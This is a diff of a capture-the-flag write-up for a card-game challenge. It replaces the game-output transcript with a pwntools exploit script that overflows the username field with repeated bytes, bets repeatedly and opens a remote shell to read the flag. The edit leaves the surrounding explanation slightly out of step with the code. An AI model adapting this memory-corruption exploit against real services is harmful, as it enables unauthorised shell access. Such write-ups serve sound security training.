@@ -77,107 +77,34 @@ So, in this event, when we try to play a card, the memory region breaks because 
 
 Theoretically, this means we are free to keep playing, since we are only limited by 100 coins or deck size of `26` which is now astronomically too big. So let's try to keep betting 1 till something happens. After the initial `26` cards, we are now left with 0 cards and this happens.
 
-    The opponent has a 0 of suit 0.
-    You have a 0 of suit 0.
-    You lost! :(
+```python
+ from pwn import *
+HOST, PORT = 'shell2017.picoctf.com',7253
+r = remote(HOST, PORT)
+r.recv()
+username = b'\x03' * 100
+r.sendline(username)
+r.recv()
+for i in range(60):
+    r.sendline(b'01')
+    log.info(r.recv())
 
-    You have 73 coins.
-    How much would you like to bet?
+r.sendline(b'40')
+log.info(r.recv())
+r.sendline(b'80')
+log.info(r.recv())
+r.sendline(b'160')
+log.info(r.recv())
+r.sendline(b'200')
+log.info(r.recv())
+r.interactive()
+r.close()
+```
+```text
 
-Let's keep pushing. By now, we are accessing areas in the memory outside our actual decks, so we are bound to get crazy numbers like,
-
-    How much would you like to bet?
-    1
-    The opponent has a 0 of suit 0.
-    You have a 65 of suit 65.
-    You won? Hmmm something must be wrong...
-    Cheater. That's not actually a valid card.
-
-    You have 48 coins.
-    How much would you like to bet?
-    1
-    The opponent has a 0 of suit 0.
-    You have a 65 of suit 65.
-    You won? Hmmm something must be wrong...
-    Cheater. That's not actually a valid card.
-
-    You have 48 coins.
-    How much would you like to bet?
-
-Let's keep going,
-
-    How much would you like to bet?
-    1
-    you bet 1.
-    The opponent has a 0 of suit 0.
-    You have a -1 of suit -68.
-    You lost! :(
-
-Woah, negative numbers! Suddenly,
-
-    you bet 1.
-    The opponent has a 0 of suit 0.
-    You have a 13 of suit 0.
-    You won? Hmmm something must be wrong...
-    You actually won! Nice job
-
-    You have 22 coins.
-    How much would you like to bet?
-
-Bingo. Now let's try to recoup our losses shall we! (_Don't do this in real life, you will go bankrupt._)
-
-    You have 22 coins.
-    How much would you like to bet?
-    22
-    you bet 22.
-    The opponent has a 0 of suit 0.
-    You have a 9 of suit 2.
-    You won? Hmmm something must be wrong...
-    You actually won! Nice job
-
-    You have 44 coins.
-    How much would you like to bet?
-    44
-    you bet 44.
-    The opponent has a 0 of suit 0.
-    You have a 11 of suit 1.
-    You won? Hmmm something must be wrong...
-    You actually won! Nice job
-
-    You have 88 coins.
-    How much would you like to bet?
-    88
-    you bet 88.
-    The opponent has a 0 of suit 0.
-    You have a 11 of suit 3.
-    You won? Hmmm something must be wrong...
-    You actually won! Nice job
-
-    You have 176 coins.
-    How much would you like to bet?
-    176
-    you bet 176.
-    The opponent has a 0 of suit 0.
-    You have a 12 of suit 3.
-    You won? Hmmm something must be wrong...
-    You actually won! Nice job
-
-    You have 352 coins.
-    How much would you like to bet?
-    352
-    you bet 352.
-    The opponent has a 0 of suit 0.
-    You have a 13 of suit 1.
-    You won? Hmmm something must be wrong...
-    You actually won! Nice job
-    You won the game! That's real impressive, seeing as the deck was rigged...
-    /bin/sh: 0: can't access tty; job control turned off
-    $ ls
-    flag.txt
-    war
-    war_no_aslr
-    xinetd_wrapper.sh
-    $ cat flag.txt
-    04ab44dab3330a7633d9956b789f2769
+```
 
 Therefore, the flag is `04ab44dab3330a7633d9956b789f2769`.
+<!--stackedit_data:
+eyJoaXN0b3J5IjpbLTYyNTc3NzUzMl19
+-->
